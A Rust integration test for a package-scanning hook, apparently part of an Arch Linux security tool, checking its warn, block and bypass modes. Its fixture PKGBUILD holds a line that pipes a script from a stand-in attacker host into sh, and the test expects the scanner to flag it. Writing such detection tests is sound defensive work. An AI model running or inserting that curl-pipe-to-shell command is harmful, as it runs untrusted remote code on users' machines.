use std::io::Write;
use std::process::{Command, Stdio};

#[test]
fn hook_warns_blocks_and_bypasses_correctly() {
    let bin = env!("CARGO_BIN_EXE_arch-fos");
    let dir = std::env::temp_dir().join(format!(
        "arch_fos_hook_test_{}",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos()
    ));
    let pkg_dir = dir.join("evil-pkg");
    std::fs::create_dir_all(&pkg_dir).unwrap();
    std::fs::write(
        pkg_dir.join("PKGBUILD"),
        "pkgname=evil-pkg\nprepare() {\n  curl https://evil.test/x.sh | sh\n}\n",
    )
    .unwrap();

    let run_hook = |args: &[&str]| {
        let mut child = Command::new(bin)
            .args(args)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .expect("spawn arch-fos");
        child
            .stdin
            .as_mut()
            .unwrap()
            .write_all(b"evil-pkg\n")
            .unwrap();
        child.wait_with_output().unwrap()
    };

    let dir_str = dir.to_str().unwrap();

    // Warn mode: exits 0 even with critical finding
    let warn_out = run_hook(&[
        "hook",
        "--mode",
        "warn",
        "--threshold",
        "high",
        "--pkgbuilds-dir",
        dir_str,
        "--db-path",
        "/nonexistent.db",
        "--collector-socket",
        "/nonexistent.sock",
    ]);
    assert!(warn_out.status.success());
    let warn_err = String::from_utf8_lossy(&warn_out.stderr);
    assert!(warn_err.contains("pkgbuild_curl_pipe_sh"));

    // Block mode: exits non-zero
    let block_out = run_hook(&[
        "hook",
        "--mode",
        "block",
        "--threshold",
        "high",
        "--pkgbuilds-dir",
        dir_str,
        "--db-path",
        "/nonexistent.db",
        "--collector-socket",
        "/nonexistent.sock",
    ]);
    assert!(!block_out.status.success());

    // Bypass mode: exits 0 even in block mode
    let bypass_out = run_hook(&[
        "hook",
        "--mode",
        "block",
        "--threshold",
        "high",
        "--bypass",
        "--pkgbuilds-dir",
        dir_str,
        "--db-path",
        "/nonexistent.db",
        "--collector-socket",
        "/nonexistent.sock",
    ]);
    assert!(bypass_out.status.success());
    let bypass_err = String::from_utf8_lossy(&bypass_out.stderr);
    assert!(bypass_err.contains("explicit bypass"));

    let _ = std::fs::remove_dir_all(&dir);
}
